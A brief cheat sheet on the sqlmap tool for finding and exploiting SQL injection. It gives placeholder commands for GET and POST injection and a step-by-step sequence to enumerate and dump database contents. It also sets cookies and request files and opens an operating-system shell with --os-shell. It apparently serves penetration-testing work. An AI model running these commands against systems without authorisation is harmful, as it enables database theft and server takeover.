---
tags:
---

# Sqlmap
---

Sqlmap is **an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers**.

## Usage
---

### GET
---

```bash
sqlmap -u "<URL>" -p "<injection parameter>" --dbs
```

### POST
---

```bash
sqlmap -u "<URL>" --data=<POST string> -p <injection parameter> id --technique=U --dbs
```

> `--technique=U` tells Sqlmap to use a UNION based SQL injection technique.

### Steps for dumping database
---

1. Step 1: List information about the existing databases
    
    ```bash
    sqlmap -u "<URL>" --dbs
    ```
    
2. Step 2: List information about Tables present in a particular Database
    
    ```bash
    sqlmap -u "<URL>"  -D <database we found> --tables
    ```
    
3. Step 3: List information about the columns of a particular table
    
    ```bash
    sqlmap -u "<URL>"  -D <database we found> -T <Tables we found> --columns
    ```
    
4. Step 4: Dump the data from the columns
    
    ```bash
    sqlmap -u "<URL>" -D <database we found> -T <Tables we found> -C <Columns we found> --dump
    ```
    

### Specify
---

- Cookie
    
    ```bash
    sqlmap -u "<URL>" -p title --cookie "<cookie>"
    ```
    
- File (and take "title" as the test parameter)
    
    ```bash
    sqlmap -r request -p title
    ```
    

### GET Shell
---

```bash
sqlmap -r request -p title --os-shell
```





